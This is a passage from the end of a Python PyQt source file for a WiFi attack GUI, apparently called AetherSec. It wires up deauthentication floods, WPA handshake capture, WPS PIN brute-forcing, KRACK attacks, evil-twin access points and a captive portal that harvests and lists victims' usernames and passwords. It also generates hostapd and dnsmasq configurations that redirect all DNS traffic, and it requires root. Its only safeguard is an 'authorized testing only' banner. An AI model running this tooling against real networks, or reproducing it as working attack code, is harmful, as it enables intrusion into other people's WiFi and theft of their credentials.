            bssid=self.selected_network.bssid,
            client_mac=client_mac,
            channel=self.selected_network.channel,
            count=self.deauth_count.value()
        )

        self.deauth_worker.status_changed.connect(self._on_deauth_status)
        self.deauth_worker.packets_sent.connect(lambda x: self.handshake_terminal.append_output(f"Deauth packets sent: {x}"))
        self.deauth_worker.start()

    def _on_deauth_status(self, status: str):
        self.handshake_terminal.append_output(status)

    def _start_handshake_capture(self):
        if not self.selected_interface or not self.selected_network:
            QMessageBox.warning(self, "Error", "Select interface and target network")
            return

        output_file = self.handshake_file.text().strip()

        self.handshake_worker = HandshakeCapture(
            interface=self.selected_interface,
            bssid=self.selected_network.bssid,
            ssid=self.selected_network.ssid,
            channel=self.selected_network.channel,
            output_file=output_file
        )

        self.handshake_worker.status_changed.connect(self._on_handshake_status)
        self.handshake_worker.handshake_captured.connect(self._on_handshake_captured)
        self.handshake_worker.start()

        self.handshake_btn.setEnabled(False)
        self.handshake_stop_btn.setEnabled(True)

    def _stop_handshake_capture(self):
        if self.handshake_worker:
            self.handshake_worker.stop()
            self.handshake_worker.wait(timeout=2000)

        self.handshake_btn.setEnabled(True)
        self.handshake_stop_btn.setEnabled(False)

    def _on_handshake_status(self, status: str):
        self.handshake_terminal.append_output(status)

    def _on_handshake_captured(self, filepath: str):
        self.handshake_terminal.append_output(f"[+] Handshake saved to: {filepath}", COLORS['success'])
        QMessageBox.information(self, "Success", f"Handshake captured!\nFile: {filepath}")

    # =========================================================================
    # WPS
    # =========================================================================

    def _start_wps_attack(self):
        if not self.selected_interface or not self.selected_network:
            QMessageBox.warning(self, "Error", "Select interface and target network")
            return

        self.wps_worker = WPSAttack(
            interface=self.selected_interface,
            bssid=self.selected_network.bssid,
            channel=self.selected_network.channel,
            pixie=self.pixie_checkbox.isChecked(),
            brute_force=self.brute_force_checkbox.isChecked()
        )

        self.wps_worker.status_changed.connect(self._on_wps_status)
        self.wps_worker.wps_success.connect(self._on_wps_success)
        self.wps_worker.start()

        self.wps_start_btn.setEnabled(False)
        self.wps_stop_btn.setEnabled(True)

    def _stop_wps_attack(self):
        if self.wps_worker:
            self.wps_worker.stop()
            self.wps_worker.wait(timeout=2000)

        self.wps_start_btn.setEnabled(True)
        self.wps_stop_btn.setEnabled(False)

    def _on_wps_status(self, status: str):
        self.wps_terminal.append_output(status)

    def _on_wps_success(self, pin: str, password: str):
        self.wps_terminal.append_output(f"[+] WPS PIN: {pin}", COLORS['success'])
        if password:
            self.wps_terminal.append_output(f"[+] WPA Password: {password}", COLORS['success'])
        QMessageBox.information(self, "WPS Success", f"PIN: {pin}\nPassword: {password}")

    # =========================================================================
    # KRACK
    # =========================================================================

    def _start_krack_attack(self):
        if not self.selected_interface or not self.selected_network:
            QMessageBox.warning(self, "Error", "Select interface and target network")
            return

        attack_type = self.krack_type_group.checkedButton().value() if self.krack_type_group.checkedButton() else "all"

        self.krack_worker = KRACKAttack(
            interface=self.selected_interface,
            bssid=self.selected_network.bssid,
            ssid=self.selected_network.ssid,
            channel=self.selected_network.channel,
            attack_type=attack_type
        )

        self.krack_worker.status_changed.connect(self._on_krack_status)
        self.krack_worker.vulnerability_found.connect(self._on_krack_vulnerability)
        self.krack_worker.attack_progress.connect(lambda x: self.krack_terminal.append_output(x))
        self.krack_worker.start()

        self.krack_start_btn.setEnabled(False)
        self.krack_stop_btn.setEnabled(True)
        self.krack_results.clear()

    def _stop_krack_attack(self):
        if self.krack_worker:
            self.krack_worker.stop()
            self.krack_worker.wait(timeout=2000)

        self.krack_start_btn.setEnabled(True)
        self.krack_stop_btn.setEnabled(False)

    def _on_krack_status(self, status: str):
        self.krack_terminal.append_output(status)

    def _on_krack_vulnerability(self, vuln_type: str, result: str):
        color = COLORS['danger'] if result == "VULNERABLE" else COLORS['success']
        self.krack_results.append(f"{vuln_type}: {result}")

    # =========================================================================
    # CAPTIVE PORTAL
    # =========================================================================

    def _start_captive_portal(self):
        template = self.captive_template.currentText()

        self.captive_worker = CaptiveFlaskWorker(
            template=template,
            interface=self.selected_interface or "wlan0"
        )

        self.captive_worker.status_changed.connect(self._on_captive_status)
        self.captive_worker.credentials_captured.connect(self._on_credentials_captured)
        self.captive_worker.start()

        self.captive_start_btn.setEnabled(False)
        self.captive_stop_btn.setEnabled(True)

    def _stop_captive_portal(self):
        if self.captive_worker:
            self.captive_worker.stop()
            self.captive_worker.wait(timeout=2000)

        self.captive_start_btn.setEnabled(True)
        self.captive_stop_btn.setEnabled(False)

    def _on_captive_status(self, status: str):
        self.captive_terminal.append_output(status)

    def _on_credentials_captured(self, username: str, password: str):
        self.captured_creds.append(f"User: {username} | Pass: {password}")

    # =========================================================================
    # MANUAL BUILDER
    # =========================================================================

    def _on_security_changed(self, text: str):
        self.manual_password.setEnabled(text != "Open")

    def _generate_config(self):
        interface = self.manual_interface.currentText()
        ssid = self.manual_ssid.text()
        channel = self.manual_channel.value()
        hw_mode = self.manual_hw_mode.currentText()[0]
        security = self.manual_security.currentText()
        password = self.manual_password.text()
        ip = self.manual_ip.text()
        dhcp_start = self.manual_dhcp_start.text()
        dhcp_end = self.manual_dhcp_end.text()
        dns = self.dns

        # Generate hostapd config
        hostapd_config = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
wmm_enabled=1
auth_algs=1
"""

        if security == "WPA2":
            hostapd_config += f"""wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
"""
        elif security == "WPA3":
            hostapd_config += f"""wpa=3
wpa_passphrase={password}
wpa_key_mgmt=SAE
wpa_pairwise=CCMP
rsn_pairwise=CCMP
"""

        # Generate dnsmasq config
        dnsmasq_config = f"""interface={interface}
dhcp-range={dhcp_start},{dhcp_end},255.255.255.0,12h
dhcp-option=option:router,{ip}
dhcp-option=option:dns-server,{dns}
listen-address={ip}
bind-interfaces
log-dhcp
"""

        # Add captive portal redirect
        dnsmasq_config += f"address=/#{ip}\n"

        preview = f"# === hostapd.conf ===\n{hostapd_config}\n# === dnsmasq.conf ===\n{dnsmasq_config}"
        self.config_preview.setText(preview)

    def _start_manual_ap(self):
        if not self.selected_interface:
            QMessageBox.warning(self, "Error", "Select an interface first")
            return

        self._generate_config()

        # Simplified: just call evil twin with current settings
        self.evil_ssid.setText(self.manual_ssid.text())
        self.evil_channel.setValue(self.manual_channel.value())
        self.open_wifi_checkbox.setChecked(self.manual_security.currentText() == "Open")

        if self.manual_security.currentText() != "Open":
            self.evil_password.setText(self.manual_password.text())

        self._start_evil_twin()

    def _stop_manual_ap(self):
        self._stop_evil_twin()

    # =========================================================================
    # MENU ACTIONS
    # =========================================================================

    def _export_networks(self):
        if not self.networks:
            QMessageBox.warning(self, "Error", "No networks to export")
            return

        filename, _ = QFileDialog.getSaveFileName(self, "Export", f"networks_{int(time.time())}.json")
        if filename:
            try:
                data = []
                for net in self.networks.values():
                    data.append({
                        "bssid": net.bssid,
                        "ssid": net.ssid,
                        "channel": net.channel,
                        "signal": net.signal,
                        "security": net.security,
                        "encryption": net.encryption
                    })
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=2)
                QMessageBox.information(self, "Success", "Networks exported")
            except Exception as e:
                QMessageBox.critical(self, "Error", str(e))

    def _import_networks(self):
        filename, _ = QFileDialog.getOpenFileName(self, "Import", "", "JSON Files (*.json)")
        if filename:
            try:
                with open(filename, 'r') as f:
                    data = json.load(f)
                for item in data:
                    net = WiFiNetwork(
                        bssid=item['bssid'],
                        ssid=item['ssid'],
                        channel=item['channel'],
                        signal=item['signal'],
                        security=item['security']
                    )
                    self.networks[net.bssid] = net
                self._update_network_table()
                QMessageBox.information(self, "Success", f"Imported {len(data)} networks")
            except Exception as e:
                QMessageBox.critical(self, "Error", str(e))

    def _check_dependencies(self):
        deps = ["airodump-ng", "aireplay-ng", "hostapd", "dnsmasq", "reaver", "pyrit"]
        found, missing = [], []

        for dep in deps:
            result = subprocess.run(["which", dep], capture_output=True)
            if result.returncode == 0:
                found.append(dep)
            else:
                missing.append(dep)

        msg = "Found:\n" + "\n".join(found) + "\n\nMissing:\n" + ("\n".join(missing) if missing else "None")
        QMessageBox.information(self, "Dependencies", msg)

    def _mac_changer(self):
        QMessageBox.information(self, "MAC Changer", "Use: sudo macchanger -r <interface>")

    def _show_about(self):
        QMessageBox.about(self, "About", f"""
{APP_NAME} v{APP_VERSION}

Advanced WiFi Penetration Testing Framework

Integrates: wifipumpkin3, airgeddon, KRACK attacks

Features:
- Network Reconnaissance
- Evil Twin / Honeypot
- Handshake Capture
- WPS Attacks (Reaver)
- KRACK Vulnerability Testing
- Captive Portal
- Manual AP Builder

⚠️ AUTHORIZED PENETRATION TESTING ONLY!
        """)

    def closeEvent(self, event):
        """Cleanup on close"""
        self._stop_scanner()
        self._stop_evil_twin()
        self._stop_wps_attack()
        self._stop_krack_attack()
        self._stop_captive_portal()
        self._stop_handshake_capture()

        # Kill any remaining processes
        subprocess.run(["sudo", "killall", "hostapd", "dnsmasq", "airodump-ng", "aireplay-ng"],
                      capture_output=True)

        event.accept()


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    if os.geteuid() != 0:
        print("ERROR: This application must be run as root!")
        print("Usage: sudo python3 aethersec_gui.py")
        sys.exit(1)

    app = QApplication(sys.argv)
    window = AetherSecGUI()
    window.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
